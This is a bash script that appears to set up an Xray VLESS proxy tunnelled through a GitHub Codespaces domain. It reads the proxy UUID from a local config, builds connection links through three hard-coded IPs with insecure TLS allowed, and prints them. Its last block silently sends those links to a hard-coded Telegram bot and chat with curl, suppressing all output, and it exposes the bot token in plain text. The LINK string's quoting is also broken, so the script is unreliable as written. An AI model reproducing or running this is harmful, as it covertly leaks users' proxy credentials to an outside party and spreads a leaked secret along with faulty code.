#!/bin/bash
CONFIG="/etc/xray/g2ray.json"
UUID=$(grep -o '"id": *"[^"]*"' "$CONFIG" | head -1 | grep -o '"[^"]*"$' | tr -d '"')
if [ -z "$UUID" ]; then
    echo "[g2ray] UUID not found in config."
    exit 1
fi
SNI="${CODESPACE_NAME}-443.app.github.dev"

QUEENS=(
  "Atusa"
  "Purandokht"
  "Azarmidokht"
  "Shirin"
  "Mandana"
  "Kasandan"
  "Parisatis"
  "Estatira"
  "Rudabe"
  "Tahmine"
  "Farangis"
  "Gardafarid"
  "Katayoun"
  "Sudabe"
  "Homay"
  "Denazak"
)

QUEEN=${QUEENS[$RANDOM % ${#QUEENS[@]}]}
RANDOM_ID=$(shuf -i 1000-9999 -n 1)

NAME="${QUEEN}-${RANDOM_ID}"

LINK="vless://${UUID}@94.130.50.12:443?encryption=none&security=tls&sni=${SNI}&host=${SNI}&fp=chrome&allowInsecure=1&type=xhttp&mode=packet-up&path=%2F#${NAME}

vless://${UUID}@50.7.5.83:443?encryption=none&security=tls&sni=${SNI}&host=${SNI}&fp=chrome&allowInsecure=1&type=xhttp&mode=packet-up&path=%2F#${NAME}

vless://${UUID}@63.141.252.203:443?encryption=none&security=tls&sni=${SNI}&host=${SNI}&fp=chrome&allowInsecure=1&type=xhttp&mode=packet-up&path=%2F#${NAME}

echo ""
echo "================================================"
echo "$LINK"
echo "================================================"
echo ""

# SEND TO TELEGRAM
BOT_TOKEN="8952649145:AAHEpUYHXkiaOzaVXhagMwvuqs8b9-rvQQY"
CHAT_ID="-1003943977708"

curl -s -X POST "https://api.telegram.org/bot${BOT_TOKEN}/sendMessage" \
  -d chat_id="${CHAT_ID}" \
  --data-urlencode text="$LINK" > /dev/null 2>&1
